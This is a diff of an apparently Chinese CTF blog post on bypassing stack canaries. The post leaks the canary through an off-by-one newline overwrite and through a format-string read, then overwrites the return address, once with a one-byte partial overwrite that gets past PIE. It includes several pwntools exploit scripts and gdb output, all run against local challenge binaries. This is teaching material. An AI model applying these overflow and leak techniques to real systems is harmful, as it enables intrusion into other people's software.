@@ -153,7 +153,7 @@
     <div><a class="about  hasFriend  site_url"  href="/about">About</a><a style="width: 50%"  class="friends">Friends</a></div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="13">
-<input type="hidden" id="yelog_site_word_count" value="11.9k">
+<input type="hidden" id="yelog_site_word_count" value="12.3k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -313,7 +313,7 @@
         
         <a  class="All PWN题 "
            href="/2020/07/03/HITCON-training-hacknote-UAF/"
-           data-tag="UAF,ctfwiki"
+           data-tag="ctfwiki,UAF"
            data-author="" >
             <span class="post-title" title="HITCON-training-hacknote(UAF)">HITCON-training-hacknote(UAF)</span>
             <span class="post-date" title="2020-07-03 10:43:46">2020/07/03</span>
@@ -452,15 +452,66 @@
 <h2 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h2><p>有些程序会把我们输入的数据赋给x变量，然后又再次把x变量的值打印出来。<br>最常见的是打印欢迎词。例如《第二届浙江省网安竞赛初赛-uninit》里面一样。</p>
 <p>我们利用读入x变量，正好溢出到canary的位置，然后输出printf的时候就可以把canary的值当做x变量的一部分进行输出，泄露Canary的值。</p>
 <p>大致exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">"Hello radish!n"</span>)</span><br><span class="line">r.sendline(<span class="string">"a"</span>*<span class="number">100</span>)</span><br><span class="line">r.recvuntil(<span class="string">"a"</span>*<span class="number">100</span>)</span><br><span class="line">canary = u32(r.recv(<span class="number">4</span>))<span class="number">-0x0a</span>     <span class="comment">#泄露出Canary的值</span></span><br><span class="line">log.info(<span class="string">"canary:"</span>+hex(canary))</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">"a"</span>*<span class="number">100</span>     <span class="comment">#填充</span></span><br><span class="line">payload += p32(canary)    <span class="comment">#把泄露的canary值填回去（rbp-0x8）</span></span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">8</span>      <span class="comment">#随便填    </span></span><br><span class="line">payload += <span class="string">"aaaa"</span>     <span class="comment">#ebp位置</span></span><br><span class="line">payload += p32(shell_addr)    <span class="comment"># 覆盖返回地址</span></span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">r.recvuntil(&quot;Hello radish!n&quot;)
+r.sendline(&quot;a&quot;*100)
+r.recvuntil(&quot;a&quot;*100)
+canary = u32(r.recv(4))-0x0a     #泄露出Canary的值
+log.info(&quot;canary:&quot;+hex(canary))
+
+payload =  &quot;a&quot;*100     #填充
+payload += p32(canary)    #把泄露的canary值填回去（rbp-0x8）
+payload += &quot;a&quot;*8      #随便填    
+payload += &quot;aaaa&quot;     #ebp位置
+payload += p32(shell_addr)    # 覆盖返回地址
+r.sendline(payload)</code></pre>
 <p>相关解释：<br>注意第三行我们是使用sendline()发送数据，sendline()会自动在数据最后加上 “\n”，即换行符\x0a，所以 “\x0a”作为多出来的一字节将会把Canary的低字节给覆盖掉。<br>记得我们在开篇介绍里讲过Canary，它的低字节总是以”\x00”结尾，由于是小端序，所以将\x00放在前面，目的就是为了截断打印。但是现在\x00被覆盖为了\x0a，所以将持续输出导致Canary的值也给输出来了。我们要做的就是接收它。接收的4字节数据的低字节还是”\x0a”，所以我们再减去”\x0a”便是”\x00”,现在这4字节就是Canary的值了。最后构造payload时找准位置将Canary填回去就可了。</p>
 <h3 id="例题（-Bypass-Canary-babypie）："><a href="#例题（-Bypass-Canary-babypie）：" class="headerlink" title="*例题（/Bypass-Canary/babypie）："></a>*例题（/Bypass-Canary/babypie）：</h3><p>buf栈的大小是0x30（40字节），再加上Canary，所以说虽然栈空间开了48字节，但是我们能写入的只有40字节，剩下的8字节是用来存Canary的。  存在off by one漏洞。</p>
 <p>看图应该能理解：<br><img src="https://i.loli.net/2020/07/04/DtZR6UfbLVlMK9O.jpg" alt="栈分布"></p>
 <p>直接贴上exp，我在exp里解释的很详细了，包括程序调试结果。</p>
-<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./babypie'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">io.sendline(<span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line">gdb.attach(io,<span class="string">''</span>)</span><br><span class="line"><span class="comment">#输入 stack 查看栈数据</span></span><br><span class="line"><span class="comment">#发现 0008| 0x7ffd3bbfd4b0 ('a' &lt;repeats 40 times&gt;, "\n\224\342kLG\367\025")</span></span><br><span class="line"><span class="comment">#0x7ffd3bbfd4b0这个地址应该就是我们的输入，写的很清楚，'a'有40次</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb-peda$ x/20xg 0x7ffd3bbfd4b0</span></span><br><span class="line"><span class="comment"># 0x7ffd3bbfd4b0:	0x6161616161616161	0x6161616161616161</span></span><br><span class="line"><span class="comment"># 0x7ffd3bbfd4c0:	0x6161616161616161	0x6161616161616161</span></span><br><span class="line"><span class="comment"># 0x7ffd3bbfd4d0:	0x6161616161616161	0x15f7474c6be2940a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#于是填入40字节的a，多出来的 \x0a 把Canary的低字节给覆盖了！</span></span><br><span class="line">io.recvuntil(<span class="string">"\x0a"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"\x0a"</span>)</span><br><span class="line"><span class="comment">#至于这里为什么是有两个recvuntil("\x0a")</span></span><br><span class="line"><span class="comment">#解释：调试一遍就知道了</span></span><br><span class="line"><span class="comment">#返回的数据是：</span></span><br><span class="line"><span class="comment"># [DEBUG] Received 0x4f bytes:</span></span><br><span class="line"><span class="comment">#     00000000  49 6e 70 75  74 20 79 6f  75 72 20 4e  61 6d 65 3a  │Inpu│t yo│ur N│ame:│</span></span><br><span class="line"><span class="comment">#     00000010  0a 48 65 6c  6c 6f 20 61  61 61 61 61  61 61 61 61  │·Hel│lo a│aaaa│aaaa│</span></span><br><span class="line"><span class="comment">#     00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span></span><br><span class="line"><span class="comment">#     00000030  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 0a  │aaaa│aaaa│aaaa│aaa·│</span></span><br><span class="line"><span class="comment">#     00000040  84 2e f4 09  9f 59 ea 30  b0 01 a7 ff  7f 3a 0a     │·.··│·Y·0│····│·:·│</span></span><br><span class="line"><span class="comment">#     0000004f</span></span><br><span class="line"><span class="comment">#可见全文有3个0a，我们需要的是第二个0a后面的7个字节数据，所以自然要写两遍recvuntil("\x0a")啦。</span></span><br><span class="line"></span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#rjust，意为将该不满8字节的地址从低字节开始填充00，填满8字节。</span></span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,'')</span></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">40</span>+p64(canary)+p64(<span class="number">0xdeadbeef</span>)+p8(<span class="number">0x3e</span>)</span><br><span class="line"><span class="comment">#这里的p8很有灵性，只修改一个字节。</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p>有一点我要拿出来讲。由于本题程序偏移0xa3e的位置是有后门函数的，所以我们在构造payload时将返回地址覆盖为后门函数。但是由于存在PIE保护机制，后门函数的完整实际内存地址我们又不知道。所以就只修改<code>低字节</code>.<br>我调试的时候看过了，算了，贴上调试过程解释起来更清楚一点：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffa701afe0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffa701aff0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffa701b000</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0xea599f09f42e840a</span>  &lt;==Canary值</span><br><span class="line"><span class="number">0x7fffa701b010</span>:	<span class="number">0x00007fffa701b030</span>	<span class="number">0x000055e225e16a6a</span>  &lt;==返回地址</span><br></pre></td></tr></table></figure>
+<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><pre><code class="python">#coding=utf-8
+from pwn import *
+io=process(&#39;./babypie&#39;)
+context.log_level=&#39;debug&#39;
+io.sendline(&#39;a&#39;*40)
+gdb.attach(io,&#39;&#39;)
+#输入 stack 查看栈数据
+#发现 0008| 0x7ffd3bbfd4b0 (&#39;a&#39; &lt;repeats 40 times&gt;, &quot;\n\224\342kLG\367\025&quot;)
+#0x7ffd3bbfd4b0这个地址应该就是我们的输入，写的很清楚，&#39;a&#39;有40次
 
+# gdb-peda$ x/20xg 0x7ffd3bbfd4b0
+# 0x7ffd3bbfd4b0:    0x6161616161616161    0x6161616161616161
+# 0x7ffd3bbfd4c0:    0x6161616161616161    0x6161616161616161
+# 0x7ffd3bbfd4d0:    0x6161616161616161    0x15f7474c6be2940a
+
+#于是填入40字节的a，多出来的 \x0a 把Canary的低字节给覆盖了！
+io.recvuntil(&quot;\x0a&quot;)
+io.recvuntil(&quot;\x0a&quot;)
+#至于这里为什么是有两个recvuntil(&quot;\x0a&quot;)
+#解释：调试一遍就知道了
+#返回的数据是：
+# [DEBUG] Received 0x4f bytes:
+#     00000000  49 6e 70 75  74 20 79 6f  75 72 20 4e  61 6d 65 3a  │Inpu│t yo│ur N│ame:│
+#     00000010  0a 48 65 6c  6c 6f 20 61  61 61 61 61  61 61 61 61  │·Hel│lo a│aaaa│aaaa│
+#     00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+#     00000030  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 0a  │aaaa│aaaa│aaaa│aaa·│
+#     00000040  84 2e f4 09  9f 59 ea 30  b0 01 a7 ff  7f 3a 0a     │·.··│·Y·0│····│·:·│
+#     0000004f
+#可见全文有3个0a，我们需要的是第二个0a后面的7个字节数据，所以自然要写两遍recvuntil(&quot;\x0a&quot;)啦。
+
+canary=u64(io.recv(7).rjust(8,&#39;\x00&#39;))
+#rjust，意为将该不满8字节的地址从低字节开始填充00，填满8字节。
+print hex(canary)
+
+# gdb.attach(io,&#39;&#39;)
+payload2=&#39;a&#39;*40+p64(canary)+p64(0xdeadbeef)+p8(0x3e)
+#这里的p8很有灵性，只修改一个字节。
+io.send(payload2)
+io.interactive()</code></pre>
+<p>有一点我要拿出来讲。由于本题程序偏移0xa3e的位置是有后门函数的，所以我们在构造payload时将返回地址覆盖为后门函数。但是由于存在PIE保护机制，后门函数的完整实际内存地址我们又不知道。所以就只修改<code>低字节</code>.<br>我调试的时候看过了，算了，贴上调试过程解释起来更清楚一点：</p>
+<pre><code class="python">0x7fffa701afe0:    0x6161616161616161    0x6161616161616161
+0x7fffa701aff0:    0x6161616161616161    0x6161616161616161
+0x7fffa701b000:    0x6161616161616161    0xea599f09f42e840a  &lt;==Canary值
+0x7fffa701b010:    0x00007fffa701b030    0x000055e225e16a6a  &lt;==返回地址</code></pre>
 <p>可以看到40字节的垃圾数据。多出来的”0a”把Canary低字节给覆盖了。所以Canary真正的值应为0xea599f09f42e8400。接下来8字节是rbp，再接下去8字节（0x7fffa701b018的位置）就是我们的返回地址了。我们发现低2字节为 6a6a （这么写虽然不规范，但是为了方便两者比较） 而我们的后门函数的偏移（低字节）为 a3e，怎么样，是不是就只需要修改最后1字节就好了呢。</p>
 <p>神奇吧。我一开始做到这题的时候就惊呼：涨知识了。使用p8()只修改1字节即可令返回地址整个地址变成后门函数的地址。因此可以忽略PIE带给我们的限制。</p>
 <p>看来本题的关键字是 低字节 没错了。</p>
@@ -476,11 +527,22 @@
 <p>char buf; // [esp+8h] [ebp-70h]<br>…..<br>read(0, &amp;buf, 0x78u);</p>
 </blockquote>
 <p>重点分析main函数中Canary的有关代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">mov     edx, [ebp+var_C]</span><br><span class="line">xor     edx, large gs:<span class="number">14</span>h</span><br><span class="line">jz      short loc_804878A</span><br></pre></td></tr></table></figure>
+<pre><code class="python">mov     eax, 0
+mov     edx, [ebp+var_C]
+xor     edx, large gs:14h
+jz      short loc_804878A</code></pre>
 <p>看来Canary的值被放入到了 Var_C 变量里。我们直接点击Var_C 跟着来到栈里查看分布。<br>如下：<br><img src="https://i.loli.net/2020/07/04/eMH4aKCPBWtLVzw.jpg" alt="计算偏移"></p>
 <p>format变量存放着我们的输入，而本题存在格式化字符串漏洞。所以我们就能先计算出format和Var_C之间的偏移为7，然后通过格式化字符 %7$x 偏移7泄露Canary的值。</p>
-<h4 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./bin'</span>)</span><br><span class="line">leak=<span class="string">'%7$x'</span>    <span class="comment">#直接看栈，format到var_c的距离为7</span></span><br><span class="line">p.sendline(leak)</span><br><span class="line">canary_addr=int(p.recv(),<span class="number">16</span>)</span><br><span class="line">getflag=<span class="number">0x0804863B</span>  <span class="comment">#后门函数</span></span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x70</span><span class="number">-0xc</span>)+p32(canary_addr)+<span class="string">'a'</span>*<span class="number">12</span>+p32(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
+<h4 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h4><pre><code class="python">#coding=utf-8
+from pwn import *
+p=process(&#39;./bin&#39;)
+leak=&#39;%7$x&#39;    #直接看栈，format到var_c的距离为7
+p.sendline(leak)
+canary_addr=int(p.recv(),16)
+getflag=0x0804863B  #后门函数
+payload=&#39;a&#39;*(0x70-0xc)+p32(canary_addr)+&#39;a&#39;*12+p32(getflag)
+p.sendline(payload)
+p.interactive()</code></pre>
 <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>思路一是通过sendline()发送满栈数据， off by one，刚好溢出的1字节覆盖canary的低字节00为0a，令printf持续输出泄露canary的值。</p>
 <p>思路二是通过格式化字符串漏洞泄露，格式化字符串只要利用的好，就可以泄露任意地址，以及任意地址写入。</p>
 <p>总算是写完了，呼~  QAQ</p>
